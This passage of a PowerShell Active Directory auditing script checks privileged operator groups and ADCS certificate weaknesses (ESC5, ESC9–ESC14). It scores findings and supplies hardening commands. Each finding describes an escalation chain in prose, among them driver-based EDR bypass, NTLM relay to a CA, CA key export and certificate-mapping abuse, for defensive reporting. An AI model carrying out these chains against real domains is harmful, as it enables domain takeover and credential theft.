        -Resources ($accountOps | ForEach-Object { $_.SamAccountName }) `
        -AttackPath "Account Operator -> add self to Backup Operators -> SeBackupPrivilege -> NTDS.dit -> domain compromise. Also: add user to Server Operators -> interactive logon to DCs." `
        -Fix "Empty Account Operators on production DCs. Use delegated OU-scoped permissions instead of built-in groups." `
        -MITRE "T1098" -CIS "2.2.4" -Pts 0 -Max 3
}

# 24.4 Server Operators group -- SeInteractiveLogonRight on DCs
$serverOps = @()
try {
    $serverOps = @(Get-ADGroupMember "Server Operators" @dcParam -Recursive -ErrorAction SilentlyContinue |
        Where-Object { $_.objectClass -eq 'user' })
} catch {}

if ($serverOps.Count -eq 0) {
    Add-Finding "ObjOwnership" "Server Operators Group Empty" "Good" "Server Operators group has no user members -- no non-admin interactive DC logon via this group" -Pts 3 -Max 3
} else {
    Add-Finding "ObjOwnership" "Server Operators -- DC Interactive Logon Risk" "High" `
        "$($serverOps.Count) user(s) in Server Operators: $($serverOps.SamAccountName -join ', '). Can log on interactively to DCs and manage DC services -- can stop/start services, use service paths for LSA-SS access." `
        -Resources ($serverOps | ForEach-Object { $_.SamAccountName }) `
        -AttackPath "Server Operator -> interactive logon to DC -> start/stop services using service binary replacement -> SYSTEM on DC -> DCSync or NTDS.dit copy." `
        -Fix "Empty Server Operators on DCs. Delegate only the specific service management rights needed via GPO user rights assignment." `
        -MITRE "T1078.002" -CIS "2.2.4" -Pts 0 -Max 3
}

# 24.5 Print Operators group -- SeLoadDriverPrivilege -> BYOVD
$printOps = @()
try {
    $printOps = @(Get-ADGroupMember "Print Operators" @dcParam -Recursive -ErrorAction SilentlyContinue |
        Where-Object { $_.objectClass -eq 'user' })
} catch {}

if ($printOps.Count -eq 0) {
    Add-Finding "ObjOwnership" "Print Operators Group Empty" "Good" "Print Operators group has no user members -- SeLoadDriverPrivilege not exploitable via group" -Pts 3 -Max 3
} else {
    Add-Finding "ObjOwnership" "Print Operators -- Driver Load Privilege" "High" `
        "$($printOps.Count) user(s) in Print Operators: $($printOps.SamAccountName -join ', '). SeLoadDriverPrivilege enables loading unsigned/malicious kernel drivers (BYOVD)." `
        -Resources ($printOps | ForEach-Object { $_.SamAccountName }) `
        -AttackPath "Print Operator -> load vulnerable signed driver (e.g. capcom.sys) -> kernel-level code execution -> disable EDR -> dump LSA-SS/NTDS. This bypasses Credential Guard and EDR." `
        -Fix "Empty Print Operators. Manage print queues via dedicated service accounts with minimum required rights." `
        -MITRE "T1547.006" -CIS "2.2.4" -Pts 0 -Max 3
}

# 24.6 AdminSDHolder SDPROP interval -- how long until ACL changes propagate to protected accounts
$sdpropInterval = $null
try {
    $sdpropInterval = (Get-ADObject "CN=AdminSDHolder,CN=System,$domainDN" @dcParam `
        -Properties adminCount,whenChanged -ErrorAction SilentlyContinue).whenChanged
    $adminSDPropReg = Get-RegValue "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" "AdminSDProtectFrequency"
    $intervalMin = if ($adminSDPropReg) { $adminSDPropReg / 60 } else { 60 }
    if ($intervalMin -le 60) {
        Add-Finding "ObjOwnership" "AdminSDHolder SDPROP Interval" "Good" `
            "AdminSDHolder SDPROP runs every $intervalMin minutes (default 60) -- ACL changes on AdminSDHolder propagate promptly to all protected accounts" -Pts 2 -Max 2
    } else {
        Add-Finding "ObjOwnership" "AdminSDHolder SDPROP Interval Extended" "Medium" `
            "SDPROP interval is $intervalMin minutes -- ACL changes take longer to propagate. Window for ACL modification on protected accounts is extended." `
            -Fix "Reset HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\AdminSDProtectFrequency to 3600 (default = 60 minutes) or lower." `
            -Pts 0 -Max 2
    }
} catch {
    Add-Finding "ObjOwnership" "AdminSDHolder SDPROP" "Info" "Could not determine SDPROP interval" -Pts 1 -Max 2
}

# ===============================================================================
# DOMAIN 25 -- ADCS ADVANCED (ESC5 / ESC9-ESC15)
# ===============================================================================
# Extends Domains 8 and 17. Covers post-2022 attack paths from the
# "Certified Pre-Owned" research (SpecterOps) and subsequent community
# additions. Each check is self-contained with Try/Catch/Finally so that
# access-denied conditions emit a Warning finding rather than silent skips.
#
# ESC5   Dangerous PKI container ACLs (OID/AIA/CDP -- config NC objects)
# ESC9   No Security Extension + Enrollee Supplies Subject (combined)
# ESC10  Weak certificate-to-account mapping (StrongCertificateBindingEnforcement)
# ESC11  NTLM relay to MS-ICPR RPC (IF_ENFORCEENCRYPTICERTREQUEST absent)
# ESC12  CA private key in exportable software KSP (no HSM)
# ESC13  OID Group Link -- msDS-OIDToGroupLink privilege escalation
# ESC14  altSecurityIdentities write access on privileged accounts
# ESC15  EKUwu -- schema v1 template EKU injection
# ===============================================================================
Write-Section "25. ADCS ADVANCED (ESC5/ESC9-ESC15)"

if (-not $adcsAvail) {
    Add-Finding "ADCSAdvanced" "ADCS Advanced Checks" "Info" "No CA detected -- ADCS advanced checks skipped" -Pts 0 -Max 0
} else {

# -- Shared: unprivileged SID pattern (used by multiple checks below) ---------
$domSID              = $domain.DomainSID.Value
$unprivPattern       = 'Domain Users|Authenticated Users|Everyone'
$unprivSIDs          = @('S-1-5-11','S-1-1-0',"$domSID-513")
$adcsAuthorisedPattern = 'Domain Admins|Enterprise Admins|SYSTEM|Administrators|' +
                          'Cert Publishers|Key Admins|Enterprise Key Admins|NT AUTHORITY'

# -- Reload full template inventory if needed ----------------------------------
# Domain 8 loaded a subset of properties; extend it here for advanced checks.
$advTemplates = @()
try {
    $advTemplates = @(Get-ADObject `
        -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC" `
        -Filter { objectClass -eq 'pKICertificateTemplate' } `
        -Properties 'msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag',
                    'msPKI-RA-Signature','msPKI-Template-Schema-Version',
                    'msPKI-Minimal-Key-Size','msPKI-Certificate-Application-Policy',
                    'pKIExtendedKeyUsage','nTSecurityDescriptor','flags',
                    'DisplayName','revision','whenCreated','whenChanged' `
        @dcParam -ErrorAction Stop)
} catch {
    Write-AuditWarning "ADCS Advanced -- template inventory" $_.Exception.Message "ADCSAdvanced"
}

# -----------------------------------------------------------------------------
# ESC5 -- Dangerous ACLs on PKI container objects (Config NC)
#
# The OID, AIA, CDP, and Enrollment Services containers in the Configuration NC
# are less scrutinised than certificate templates but carry equal risk:
# write access to Enrollment Services allows publishing templates on CAs,
# write access to OID container enables ESC13 OID-group-link creation.
#
# MITRE T1649
# -----------------------------------------------------------------------------
$esc5Risks = [System.Collections.Generic.List[string]]::new()

$pkiContainers = @(
    "CN=Public Key Services,CN=Services,$configNC"
    "CN=Enrollment Services,CN=Public Key Services,CN=Services,$configNC"
    "CN=AIA,CN=Public Key Services,CN=Services,$configNC"
    "CN=CDP,CN=Public Key Services,CN=Services,$configNC"
    "CN=OID,CN=Public Key Services,CN=Services,$configNC"
    "CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
)

foreach ($container in $pkiContainers) {
    try {
        $containerACL = Get-Acl "AD:\$container" -ErrorAction Stop
        $riskyACEs =@( @($containerACL.Access) | Where-Object {
            $ace = $_
            $ace.AccessControlType -eq 'Allow' -and
            ($ace.ActiveDirectoryRights -band 'GenericAll'    -or
             $ace.ActiveDirectoryRights -band 'WriteDacl'     -or
             $ace.ActiveDirectoryRights -band 'WriteOwner'    -or
             $ace.ActiveDirectoryRights -band 'GenericWrite'  -or
             $ace.ActiveDirectoryRights -band 'WriteProperty') -and
            $ace.IdentityReference.Value -notmatch $adcsAuthorisedPattern
        })
        foreach ($ace in $riskyACEs) {
            $containerShort = ($container -replace '^CN=([^,]+).*','$1')
            $esc5Risks.Add("Container:$containerShort | Principal:$($ace.IdentityReference.Value) | Rights:$($ace.ActiveDirectoryRights)")
        }
    }
    catch [System.UnauthorizedAccessException] {
        Write-AuditWarning "ESC5 -- PKI container ACL ($container)" `
            "Access Denied -- re-run as Domain Admin" "ADCSAdvanced"
    }
    catch { <# object may not exist in all environments #> }
}

if ($esc5Risks.Count -eq 0) {
    Add-Finding "ADCSAdvanced" "ESC5 -- PKI Container ACLs" "Good" `
        "No unprivileged write ACLs on PKI configuration containers (OID/AIA/CDP/Enrollment Services)" -Pts 5 -Max 5
} else {
    Add-Finding "ADCSAdvanced" "ESC5 -- Dangerous PKI Container ACLs" "Critical" `
        "$($esc5Risks.Count) dangerous ACE(s) on PKI Config-NC containers. Write access = publish templates, create OID group links (ESC13), or replace CA certificates." `
        -Resources $esc5Risks `
        -AttackPath "WriteDACL on Enrollment Services -> publish any template on any CA -> instant ESC1/ESC2 attack surface without modifying existing templates" `
        -Fix "Remove non-admin write ACEs from all CN=Public Key Services sub-containers. Run: Get-Acl 'AD:\CN=Public Key Services,CN=Services,$configNC' and audit recursively." `
        -MITRE "T1649" -CIS "8.1" -Pts 0 -Max 5
    Write-Host "  [!] ESC5 PKI container risks: $($esc5Risks.Count) ACE(s)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# ESC9 -- CT_FLAG_NO_SECURITY_EXTENSION + ENROLLEE_SUPPLIES_SUBJECT
#
# Two template flags must combine for the full ESC9 attack:
#   msPKI-Certificate-Name-Flag  bit 0x1     = ENROLLEE_SUPPLIES_SUBJECT
#   msPKI-Enrollment-Flag        bit 0x1000  = CT_FLAG_NO_SECURITY_EXTENSION
#
# When both are set, the issued certificate lacks the szOID_NTDS_CA_SECURITY_EXT
# extension that binds the cert to the requestor's SID. Post-KB5014754 DCs
# require this extension for strong mapping; its absence re-enables weak UPN
# mapping, allowing SAN-based impersonation even after patching.
#
# Also check templates where ONLY the no-security-extension flag is set
# combined with unprivileged enroll -- weaker but still reportable.
#
# MITRE T1649
# -----------------------------------------------------------------------------
$esc9Critical = @($advTemplates | Where-Object {
    ($_.'msPKI-Certificate-Name-Flag' -band 0x1) -and   # ENROLLEE_SUPPLIES_SUBJECT
    ($_.'msPKI-Enrollment-Flag'        -band 0x1000) -and # NO_SECURITY_EXTENSION
    (-not ($_.'msPKI-RA-Signature' -gt 0))               # no manager approval
})

$esc9NoSecOnly = @($advTemplates | Where-Object {
    ($_.'msPKI-Enrollment-Flag' -band 0x1000) -and       # NO_SECURITY_EXTENSION
    (-not ($_.'msPKI-Certificate-Name-Flag' -band 0x1))  # but NOT enrollee-supplies-subject
})

if ($esc9Critical.Count -gt 0) {
    Add-Finding "ADCSAdvanced" "ESC9 -- No Security Extension + Enrollee Supplies Subject" "Critical" `
        "$($esc9Critical.Count) template(s) have both ENROLLEE_SUPPLIES_SUBJECT and NO_SECURITY_EXTENSION. Certificates issued lack the SID-binding extension -- bypasses KB5014754 strong-mapping enforcement." `
        -Resources ($esc9Critical.Name) `
        -AttackPath "Enroll in ESC9 template with forged SAN -> cert has no security extension -> DC uses weak UPN mapping -> PKINIT as DA even with KB5014754 applied" `
        -Fix @"
# Clear ENROLLEE_SUPPLIES_SUBJECT (bit 0x1) and NO_SECURITY_EXTENSION (bit 0x1000):
foreach (`$tmpl in @('$($esc9Critical.Name -join "','")')) {
    `$obj = Get-ADObject -LDAPFilter "(cn=`$tmpl)" -SearchBase 'CN=Certificate Templates,...' -Properties 'msPKI-Certificate-Name-Flag','msPKI-Enrollment-Flag'
    Set-ADObject `$obj -Replace @{
        'msPKI-Certificate-Name-Flag' = (`$obj.'msPKI-Certificate-Name-Flag' -band -bnot 0x1)
        'msPKI-Enrollment-Flag'       = (`$obj.'msPKI-Enrollment-Flag'       -band -bnot 0x1000)
    }
}
"@ `
        -MITRE "T1649" -CIS "8.4" -Pts 0 -Max 6
    Write-Host "  [!] ESC9 templates: $($esc9Critical.Name -join ', ')" -ForegroundColor Red
} elseif ($esc9NoSecOnly.Count -gt 0) {
    Add-Finding "ADCSAdvanced" "ESC9 -- NO_SECURITY_EXTENSION Templates (partial)" "Medium" `
        "$($esc9NoSecOnly.Count) template(s) have CT_FLAG_NO_SECURITY_EXTENSION set without ENROLLEE_SUPPLIES_SUBJECT. May be paired with ESC6 (CA-level SAN override) to achieve same impact." `
        -Resources ($esc9NoSecOnly.Name) `
        -Fix "Clear NO_SECURITY_EXTENSION (0x1000) from msPKI-Enrollment-Flag unless required by application." `
        -MITRE "T1649" -Pts 0 -Max 6
} else {
    Add-Finding "ADCSAdvanced" "ESC9 -- No Security Extension" "Good" `
        "No templates combine ENROLLEE_SUPPLIES_SUBJECT with NO_SECURITY_EXTENSION" -Pts 6 -Max 6
}

# -----------------------------------------------------------------------------
# ESC10 -- Weak Certificate-to-Account Mapping on Domain Controllers
#
# KB5014754 introduced StrongCertificateBindingEnforcement on the KDC:
#   0 = Disabled  -- no strong mapping, fully vulnerable
#   1 = Compat    -- warning mode, falls back to weak UPN mapping
#   2 = Full      -- strong mapping enforced (safe)
#
# Also checks CertificateMappingMethods on DCs for weak bit flags:
#   0x4 = Subject/Issuer (legacy -- trivially forged)
#   0x8 = UPN (spoofable via ESC1/ESC9 SAN injection)
#
# NOTE: Section 23.4 checks the local host only. This check queries all DCs.
# MITRE T1649
# -----------------------------------------------------------------------------
$esc10Risks = [System.Collections.Generic.List[PSCustomObject]]::new()

try {
    $allDCs = @(Get-ADDomainController -Filter * @dcParam -ErrorAction Stop |
                Select-Object -ExpandProperty HostName)

    foreach ($dc in $allDCs) {
        $bindVal = $null
        $mapMeth = $null
        try {
            $bindVal = (Invoke-Command -ComputerName $dc -ScriptBlock {
                (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' `
                    -Name StrongCertificateBindingEnforcement -ErrorAction SilentlyContinue
                ).StrongCertificateBindingEnforcement
            } -ErrorAction Stop)
        } catch { $bindVal = $null }

        try {
            $mapMeth = (Invoke-Command -ComputerName $dc -ScriptBlock {
                (Get-ItemProperty `
                    'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel' `
                    -Name CertificateMappingMethods -ErrorAction SilentlyContinue
                ).CertificateMappingMethods
            } -ErrorAction Stop)
        } catch { $mapMeth = $null }

        $isBindingWeak  = ($null -eq $bindVal) -or ($bindVal -lt 2)
        $isWeakMapMeth  = ($null -ne $mapMeth) -and (($mapMeth -band 0x4) -or ($mapMeth -band 0x8))

        if ($isBindingWeak -or $isWeakMapMeth) {
            $esc10Risks.Add([PSCustomObject]@{
                DC              = $dc
                BindingEnforce  = if ($null -eq $bindVal) { 'NOT SET (default=1)' } else { $bindVal }
                MappingMethods  = if ($null -eq $mapMeth) { 'NOT SET' } else { '0x{0:X}' -f $mapMeth }
                WeakMappingBits = @(
                    if ($mapMeth -band 0x4) { 'Subject/Issuer (0x4)' }
                    if ($mapMeth -band 0x8) { 'UPN (0x8)' }
                ) -join ', '
                Risk            = if ($null -eq $bindVal -or $bindVal -eq 0) { 'Critical' }
                                  elseif ($bindVal -eq 1)                     { 'High' }
                                  else                                        { 'Medium' }
            })
        }
    }
}
catch [System.UnauthorizedAccessException] {
    Write-AuditWarning "ESC10 -- DC registry query" `
        "Access Denied -- WinRM/remote registry access to DCs required. Check runs locally only." "ADCSAdvanced"
}
catch {
    Write-AuditWarning "ESC10 -- DC enumeration" $_.Exception.Message "ADCSAdvanced"
}

if ($esc10Risks.Count -eq 0) {
    Add-Finding "ADCSAdvanced" "ESC10 -- Strong Certificate Binding" "Good" `
        "All reachable DCs have StrongCertificateBindingEnforcement=2 and no weak mapping methods" -Pts 5 -Max 5
} else {
    $worstRisk = @(if ($esc10Risks | Where-Object Risk -eq 'Critical') { 'Critical' } else { 'High' })
    Add-Finding "ADCSAdvanced" "ESC10 -- Weak Certificate-to-Account Mapping on DCs" $worstRisk `
        "$($esc10Risks.Count) DC(s) accept weak certificate binding. Attacker with an ESC1/ESC9 certificate carrying a victim's UPN can authenticate via PKINIT regardless of KB5014754." `
        -Resources ($esc10Risks | ForEach-Object { "$($_.DC): Enforcement=$($_.BindingEnforce) Methods=$($_.MappingMethods) WeakBits=[$($_.WeakMappingBits)]" }) `
        -Fix @"
# Apply on each vulnerable DC (requires reboot or KDC service restart):
`$DCs = @('$($esc10Risks.DC -join "','")')
foreach (`$dc in `$DCs) {
    Invoke-Command -ComputerName `$dc -ScriptBlock {
        Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Kdc' `
            -Name StrongCertificateBindingEnforcement -Value 2 -Type DWord -Force
        # Remove weak mapping methods; keep S4U2Self (0x10) if WHfB key-trust in use
        Set-ItemProperty `
            'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel' `
            -Name CertificateMappingMethods -Value 0x18 -Type DWord -Force
        Restart-Service Kdc -Force
    }
}
"@ `
        -MITRE "T1649" -CIS "18.9.48" -Pts 0 -Max 5
    Write-Host "  [!] ESC10 weak-mapping DCs: $($esc10Risks.DC -join ', ')" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# ESC11 -- NTLM Relay to MS-ICPR RPC Enrollment Interface
#
# The CertSvc MS-ICPR RPC interface accepts certificate enrollment.
# If IF_ENFORCEENCRYPTICERTREQUEST (0x200) is absent from InterfaceFlags,
# the RPC channel does not require packet encryption. An NTLM relay to this
# interface (e.g., via PetitPotam) produces a valid certificate for the
# relayed account -- no IIS/certsrv web enrollment required.
#
# MITRE T1557, T1649
# -----------------------------------------------------------------------------
$esc11Risks = [System.Collections.Generic.List[string]]::new()
$ENFORCE_ENCRYPT_BIT = 0x200

foreach ($ca in $caObjects) {
    $caHost = $ca.dNSHostName
    $caName = $ca.Name
    $ifFlags = $null
    try {
        $ifFlags = Invoke-Command -ComputerName $caHost -ErrorAction Stop -ScriptBlock {
            param($n)
            try {
                (Get-ItemProperty `
                    "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$n" `
                    -Name InterfaceFlags -ErrorAction Stop).InterfaceFlags
            } catch { $null }
        } -ArgumentList $caName
    } catch { $ifFlags = $null }

    $rpcDisabled        = ($null -ne $ifFlags) -and ($ifFlags -band 0x8)
    $encryptionEnforced = ($null -ne $ifFlags) -and ($ifFlags -band $ENFORCE_ENCRYPT_BIT)

    if (-not $rpcDisabled -and -not $encryptionEnforced) {
        $flagDisplay = if ($null -eq $ifFlags) { 'UNREADABLE -- assume vulnerable' }
                       else { '0x{0:X}' -f $ifFlags }
        $esc11Risks.Add("CA:$caName ($caHost) InterfaceFlags=$flagDisplay")
    }
}

if ($esc11Risks.Count -eq 0) {
    Add-Finding "ADCSAdvanced" "ESC11 -- MS-ICPR RPC Encryption" "Good" `
        "All reachable CAs enforce RPC encryption on the MS-ICPR enrollment interface" -Pts 5 -Max 5
} else {
    Add-Finding "ADCSAdvanced" "ESC11 -- NTLM Relay to MS-ICPR RPC" "Critical" `
        "$($esc11Risks.Count) CA(s) accept unencrypted RPC enrollment (IF_ENFORCEENCRYPTICERTREQUEST not set). NTLM relay via PetitPotam/PrinterBug produces certificates for any coerced account." `
        -Resources $esc11Risks `
        -AttackPath "PetitPotam/PrinterBug -> coerce DC NTLM auth -> relay to CA RPC (port 49152+) -> cert for DC machine account -> DCSync via PKINIT. No IIS or web enrollment needed." `
        -Fix @"
# On each CA host -- add IF_ENFORCEENCRYPTICERTREQUEST to InterfaceFlags:
certutil -config 'CA_HOST\CA_NAME' -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc; net start certsvc
# Verify: certutil -config 'CA_HOST\CA_NAME' -getreg CA\InterfaceFlags
"@ `
        -MITRE "T1557" -CIS "8.5" -Pts 0 -Max 5
    Write-Host "  [!] ESC11 vulnerable CAs: $($caObjects.Name -join ', ')" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# ESC12 -- CA Private Key in Software KSP (Exportable via DPAPI)
#
# If the CA signing key is stored in a Microsoft software KSP (not an HSM),
# any principal with SYSTEM access to the CA host can export the private key
# using DPAPI -- then forge arbitrary certificates offline forever with no CA
# telemetry or revocation possible.
#
# Checks CSP\ProviderName registry value; HSM KSP names differ by vendor.
# MITRE T1552.004
# -----------------------------------------------------------------------------
$softwareKSPPattern = 'Microsoft Software Key Storage Provider|' +
                      'Microsoft Strong Cryptographic Provider|' +
                      'Microsoft Enhanced Cryptographic Provider|' +
                      'Microsoft Base Cryptographic Provider|' +
                      'Microsoft RSA SChannel Cryptographic Provider'

$esc12Risks = [System.Collections.Generic.List[string]]::new()

foreach ($ca in $caObjects) {
    $caHost = $ca.dNSHostName
    $caName = $ca.Name
    $kspName = $null
    try {
        $kspName = Invoke-Command -ComputerName $caHost -ErrorAction Stop -ScriptBlock {
            param($n)
            try {
                (Get-ItemProperty `
                    "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\$n\CSP" `
                    -Name ProviderName -ErrorAction Stop).ProviderName
            } catch { $null }
        } -ArgumentList $caName
    } catch { $kspName = $null }

    if ($null -eq $kspName) {
        $esc12Risks.Add("CA:$caName ($caHost) -- KSP unreadable; assume software KSP until HSM confirmed")
    } elseif ($kspName -match $softwareKSPPattern) {
        $esc12Risks.Add("CA:$caName ($caHost) -- KSP:$kspName (software KSP -- DPAPI exportable)")
    }
}

if ($esc12Risks.Count -eq 0) {
    Add-Finding "ADCSAdvanced" "ESC12 -- CA Private Key Storage" "Good" `
        "All reachable CAs store private keys in a hardware KSP or HSM" -Pts 5 -Max 5
} else {
    Add-Finding "ADCSAdvanced" "ESC12 -- CA Private Key in Exportable Software KSP" "High" `
        "$($esc12Risks.Count) CA(s) store private keys in Microsoft software KSP. SYSTEM access to CA host = offline key export = permanent offline forgery of any certificate in the PKI." `
        -Resources $esc12Risks `
        -AttackPath "RDP/WinRM/service exploit on CA host -> SYSTEM shell -> certutil -exportPFX or DPAPI MasterKey extraction -> offline CA key -> forge arbitrary certificates indefinitely without CA revocation" `
        -Fix @"
# Long-term: migrate to FIPS 140-2 Level 3 HSM
# Short-term mitigations:
#   1. Restrict CA host admin access (PAW, JEA, tiered admin)
#   2. Enable CA auditing: certutil -setreg CA\AuditFilter 127
#   3. Monitor MachineKeys directory with SACL (File Audit on $env:ProgramData\Microsoft\Crypto\RSA\MachineKeys)
#   4. Verify key not exportable: certutil -store My (check for CRYPT_EXPORTABLE)
"@ `
        -MITRE "T1552.004" -CIS "8.6" -Pts 0 -Max 5
    Write-Host "  [!] ESC12 software-KSP CAs: $($esc12Risks.Count)" -ForegroundColor DarkYellow
}

# -----------------------------------------------------------------------------
# ESC13 -- OID Group Link (msDS-OIDToGroupLink)
#
# Issuance Policy OID objects in CN=OID can link to an AD group via
# msDS-OIDToGroupLink. Enrolling in a template that embeds such a policy OID
# results in the linked group's SID being included in the Kerberos PAC --
# granting effective group membership for the certificate's lifetime without
# an actual group membership change in AD.
#
# High-value when the linked group is Domain Admins / Enterprise Admins.
# MITRE T1649, T1078.002
# -----------------------------------------------------------------------------
$esc13Risks = [System.Collections.Generic.List[string]]::new()

try {
    $oidBase     = "CN=OID,CN=Public Key Services,CN=Services,$configNC"
    $linkedOIDs  = @(Get-ADObject -SearchBase $oidBase `
                        -Filter { objectClass -eq 'msPKI-Enterprise-Oid' } `
                        -Properties 'msDS-OIDToGroupLink','name','DisplayName' `
                        @dcParam -ErrorAction Stop |
                     Where-Object { $_.'msDS-OIDToGroupLink' })

    if ($linkedOIDs.Count -gt 0) {
        # Build OID value -> group name map
        $oidGroupMap = @{}
        foreach ($oid in $linkedOIDs) {
            try {
                $grp = Get-ADGroup -Identity $oid.'msDS-OIDToGroupLink' @dcParam -ErrorAction Stop
                $oidGroupMap[$oid.name] = $grp.Name
            } catch {}
        }

        # Find templates referencing these OIDs with open enrollment
        foreach ($tmpl in $advTemplates) {
            $policyOIDs = @()
            try {
                $policyOIDs = @((Get-ADObject -Identity $tmpl.DistinguishedName `
                    -Properties 'msPKI-Certificate-Policy' @dcParam -ErrorAction Stop
                    ).'msPKI-Certificate-Policy')
            } catch {}

            foreach ($oid in $policyOIDs) {
                if (-not $oidGroupMap.ContainsKey($oid)) { continue }
                $linkedGroup = $oidGroupMap[$oid]

                # Check if unprivileged users can enroll in this template
                $aclObj       = $tmpl.nTSecurityDescriptor
                $unprivEnroll = $false
                if ($aclObj) {
                    $ENROLL_GUID = [guid]'0e10c968-78fb-11d2-90d4-00c04f79dc55'
                    $unprivEnroll =@( @($aclObj.Access) | Where-Object {
                        $_.AccessControlType -eq 'Allow' -and
                        $_.ObjectType -eq $ENROLL_GUID -and
                        $_.IdentityReference.Value -match $unprivPattern
                    })
                }
                if ($unprivEnroll) {
                    $esc13Risks.Add("Template:$($tmpl.Name) -> OID:$oid -> Group:$linkedGroup")
                }
            }
        }
    }
}
catch [System.UnauthorizedAccessException] {
    Write-AuditWarning "ESC13 -- OID Group Link" "Access Denied reading OID container" "ADCSAdvanced"
}
catch {
    Write-AuditWarning "ESC13 -- OID Group Link" $_.Exception.Message "ADCSAdvanced"
}

if ($esc13Risks.Count -eq 0) {
    Add-Finding "ADCSAdvanced" "ESC13 -- OID Group Link" "Good" `
        "No OID objects have msDS-OIDToGroupLink set, or none are reachable via unprivileged-enrollable templates" -Pts 4 -Max 4
} else {
    Add-Finding "ADCSAdvanced" "ESC13 -- OID Group Link Privilege Escalation" "Critical" `
        "$($esc13Risks.Count) template/OID combination(s) allow unprivileged users to receive privileged group SIDs in their Kerberos PAC via certificate enrollment." `
        -Resources $esc13Risks `
        -AttackPath "Domain user enrolls in linked template -> certificate carries OID policy -> KDC injects linked group SID into PAC -> user Kerberos token includes DA/EA group -> immediate domain admin access" `
        -Fix @"
# Option 1: Remove the group link from the OID object
`$oid = Get-ADObject -SearchBase 'CN=OID,...' -Filter {name -eq 'OID_VALUE'} @dcParam
Set-ADObject `$oid -Clear msDS-OIDToGroupLink

# Option 2: Restrict template enrollment to authorised accounts only
# Option 3: Delete unused issuance policy OID objects
"@ `
        -MITRE "T1649" -CIS "8.7" -Pts 0 -Max 4
    Write-Host "  [!] ESC13 OID group link risks: $($esc13Risks.Count)" -ForegroundColor Red
}

# -----------------------------------------------------------------------------
# ESC14 -- altSecurityIdentities Write Access on Privileged Accounts
#
# The altSecurityIdentities attribute stores explicit certificate-to-account
# mappings. Any principal with WriteProperty on this attribute (or GenericWrite/
# GenericAll) can bind any certificate to a target account -- enabling PKINIT
# authentication as that account with any cert, including self-signed in some
# configurations.
#
# Checks krbtgt, all AdminCount=1 users, and all DC computer accounts.
# altSecurityIdentities schema attribute GUID: bf967722-0de6-11d0-a285-00aa003049e2
#
# MITRE T1484, T1078.002
# -----------------------------------------------------------------------------
$ALT_SEC_GUID  = [guid]'bf967722-0de6-11d0-a285-00aa003049e2'
$esc14Risks    = [System.Collections.Generic.List[string]]::new()

try {
    # Target set: krbtgt + AdminCount=1 + DC computer accounts
    $esc14Targets = [System.Collections.Generic.List[string]]::new()
    try {
        @(Get-ADUser -Filter { SamAccountName -eq 'krbtgt' } @dcParam -ErrorAction Stop) +
        @(Get-ADUser -Filter { AdminCount -eq 1 -and Enabled -eq $true } @dcParam `
              -ErrorAction Stop | Select-Object -First 30) |
        Where-Object { $_ } |
        ForEach-Object { $esc14Targets.Add($_.DistinguishedName) }
    } catch {}
    try {
        Get-ADComputer -Filter { PrimaryGroupID -eq 516 } @dcParam -ErrorAction Stop |
        ForEach-Object { $esc14Targets.Add($_.DistinguishedName) }
    } catch {}

    foreach ($dn in ($esc14Targets | Sort-Object -Unique)) {
        try {
            $acl = Get-Acl "AD:\$dn" -ErrorAction Stop
            foreach ($ace in $acl.Access) {
                if ($ace.AccessControlType -ne 'Allow') { continue }
                if ($ace.IdentityReference.Value -match $adcsAuthorisedPattern) { continue }

                $isAltSecWrite  = ($ace.ActiveDirectoryRights -band 'WriteProperty') -and
                                  ($ace.ObjectType -eq $ALT_SEC_GUID)
                $isBroadWrite   = ($ace.ActiveDirectoryRights -band 'GenericWrite') -or
                                  ($ace.ActiveDirectoryRights -band 'GenericAll')

                if ($isAltSecWrite -or $isBroadWrite) {
                    $target = $dn -replace '^CN=([^,]+).*','$1'
                    $wtype  = if ($isAltSecWrite) { 'Direct altSecIds write' }
                              else               { $ace.ActiveDirectoryRights.ToString() }
                    $esc14Risks.Add("Target:$target | Principal:$($ace.IdentityReference.Value) | Type:$wtype")
                }
            }
        } catch { <# silently skip unreadable ACLs -- warning emitted above if needed #> }
    }
}
catch [System.UnauthorizedAccessException] {
    Write-AuditWarning "ESC14 -- altSecurityIdentities ACL" "Access Denied" "ADCSAdvanced"
}
catch {
    Write-AuditWarning "ESC14 -- altSecurityIdentities ACL" $_.Exception.Message "ADCSAdvanced"
}

if ($esc14Risks.Count -eq 0) {
    Add-Finding "ADCSAdvanced" "ESC14 -- altSecurityIdentities ACL" "Good" `
        "No unprivileged principals have write access to altSecurityIdentities on privileged accounts or DCs" -Pts 4 -Max 4
} else {
    Add-Finding "ADCSAdvanced" "ESC14 -- altSecurityIdentities Write on Privileged Accounts" "Critical" `
        "$($esc14Risks.Count) write ACE(s) on altSecurityIdentities allow certificate-to-account binding manipulation. Attacker binds own cert -> PKINIT as target without knowing password." `
        -Resources $esc14Risks `
        -AttackPath "Set altSecurityIdentities on DA account to attacker's self-signed cert thumbprint -> PKINIT as DA -> TGT -> full domain access. Does not require ADCS -- any cert source works if strong mapping not enforced." `
        -Fix @"
# For each affected account, remove the write ACE:
`$acl = Get-Acl 'AD:\AFFECTED_DN'
`$altSecGuid = [guid]'bf967722-0de6-11d0-a285-00aa003049e2'
`$acl.Access | Where-Object {
    (`$_.ObjectType -eq `$altSecGuid -or `$_.ActiveDirectoryRights -band 'GenericWrite,GenericAll') -and
    `$_.IdentityReference.Value -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'
} | ForEach-Object { `$acl.RemoveAccessRule(`$_) | Out-Null }
Set-Acl 'AD:\AFFECTED_DN' `$acl
# Also audit existing altSecurityIdentities values:
